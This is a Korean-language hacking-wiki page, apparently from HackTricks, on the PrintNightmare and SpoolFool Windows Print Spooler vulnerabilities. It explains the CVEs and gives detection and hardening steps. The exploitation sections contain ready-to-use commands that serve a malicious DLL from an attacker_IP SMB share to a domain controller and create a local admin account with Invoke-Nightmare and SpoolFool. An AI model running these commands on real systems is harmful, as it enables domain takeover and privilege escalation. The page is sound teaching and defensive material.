# PrintNightmare (Windows Print Spooler RCE/LPE)

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmare는 **SYSTEM으로서의 임의 코드 실행**을 허용하는 Windows **Print Spooler** 서비스의 취약점 집합에 붙여진 이름이며, 스풀러가 RPC를 통해 접근 가능할 때 **도메인 컨트롤러 및 파일 서버에서의 원격 코드 실행(RCE)**을 허용합니다. 가장 널리 악용된 CVE는 **CVE-2021-1675**(초기 LPE로 분류됨)와 **CVE-2021-34527**(전체 RCE)입니다. 이후의 문제인 **CVE-2021-34481 (“Point & Print”)**와 **CVE-2022-21999 (“SpoolFool”)**는 공격 표면이 여전히 닫히지 않았음을 증명합니다.

---

## 1. 취약한 구성 요소 및 CVE

| 연도 | CVE | 짧은 이름 | 원시 | 비고 |
|------|-----|------------|-----------|-------|
|2021|CVE-2021-1675|“PrintNightmare #1”|LPE|2021년 6월 CU에서 패치되었으나 CVE-2021-34527에 의해 우회됨|
|2021|CVE-2021-34527|“PrintNightmare”|RCE/LPE|AddPrinterDriverEx는 인증된 사용자가 원격 공유에서 드라이버 DLL을 로드할 수 있도록 허용|
|2021|CVE-2021-34481|“Point & Print”|LPE|비관리자 사용자의 서명되지 않은 드라이버 설치|
|2022|CVE-2022-21999|“SpoolFool”|LPE|임의 디렉터리 생성 → DLL 심기 – 2021년 패치 이후에도 작동|

모두 **MS-RPRN / MS-PAR RPC 메서드**(`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) 또는 **Point & Print** 내의 신뢰 관계를 악용합니다.

## 2. 악용 기술

### 2.1 원격 도메인 컨트롤러 손상 (CVE-2021-34527)

인증된 그러나 **비특권** 도메인 사용자는 다음을 통해 원격 스풀러(종종 DC)에서 **NT AUTHORITY\SYSTEM**으로 임의 DLL을 실행할 수 있습니다:
```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
-f \
'\\attacker_IP\share\evil.dll'
```
인기 있는 PoC에는 **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#) 및 Benjamin Delpy의 `misc::printnightmare / lsa::addsid` 모듈이 포함됩니다 **mimikatz**.

### 2.2 로컬 권한 상승 (지원되는 모든 Windows, 2021-2024)

같은 API를 **로컬**에서 호출하여 `C:\Windows\System32\spool\drivers\x64\3\`에서 드라이버를 로드하고 SYSTEM 권한을 얻을 수 있습니다:
```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```
### 2.3 SpoolFool (CVE-2022-21999) – 2021 수정 사항 우회

Microsoft의 2021 패치는 원격 드라이버 로딩을 차단했지만 **디렉터리 권한을 강화하지는 않았습니다**. SpoolFool은 `SpoolDirectory` 매개변수를 악용하여 `C:\Windows\System32\spool\drivers\` 아래에 임의의 디렉터리를 생성하고, 페이로드 DLL을 드롭한 후 스풀러가 이를 로드하도록 강제합니다:
```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```
> 이 익스플로잇은 2022년 2월 업데이트 이전의 완전히 패치된 Windows 7 → Windows 11 및 Server 2012R2 → 2022에서 작동합니다.

---

## 3. 탐지 및 헌팅

* **이벤트 로그** – *Microsoft-Windows-PrintService/Operational* 및 *Admin* 채널을 활성화하고 **이벤트 ID 808** “프린트 스풀러가 플러그인 모듈을 로드하지 못했습니다” 또는 **RpcAddPrinterDriverEx** 메시지를 주의 깊게 살펴보세요.
* **Sysmon** – `Event ID 7` (이미지 로드됨) 또는 `11/23` (파일 쓰기/삭제) `C:\Windows\System32\spool\drivers\*` 내에서 부모 프로세스가 **spoolsv.exe**일 때.
* **프로세스 계보** – **spoolsv.exe**가 `cmd.exe`, `rundll32.exe`, PowerShell 또는 서명되지 않은 바이너리를 생성할 때 경고.

## 4. 완화 및 강화

1. **패치!** – Print Spooler 서비스가 설치된 모든 Windows 호스트에 최신 누적 업데이트를 적용하세요.
2. **필요하지 않은 경우 스풀러를 비활성화하세요**, 특히 도메인 컨트롤러에서:
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
3. **원격 연결을 차단하되 로컬 인쇄는 허용하세요** – 그룹 정책: `컴퓨터 구성 → 관리 템플릿 → 프린터 → 클라이언트 연결 수락을 위한 프린트 스풀러 허용 = 비활성화`.
4. **포인트 및 프린트를 제한하여 관리자만 드라이버를 추가할 수 있도록** 레지스트리 값을 설정하세요:
```cmd
reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
/v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
```
자세한 안내는 Microsoft KB5005652에서 확인하세요.

---

## 5. 관련 연구 / 도구

* [mimikatz `printnightmare`](https://github.com/gentilkiwi/mimikatz/tree/master/modules) 모듈
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* SpoolFool 익스플로잇 및 작성
* SpoolFool 및 기타 스풀러 버그에 대한 0patch 마이크로패치

---

**추가 읽기 (외부):** 2024 연습 블로그 게시물 확인 – [PrintNightmare 취약점 이해하기](https://www.hackingarticles.in/understanding-printnightmare-vulnerability/)

## 참조

* Microsoft – *KB5005652: 새로운 포인트 및 프린트 기본 드라이버 설치 동작 관리*
<https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872>
* Oliver Lyak – *SpoolFool: CVE-2022-21999*
<https://github.com/ly4k/SpoolFool>
{{#include ../../banners/hacktricks-training.md}}
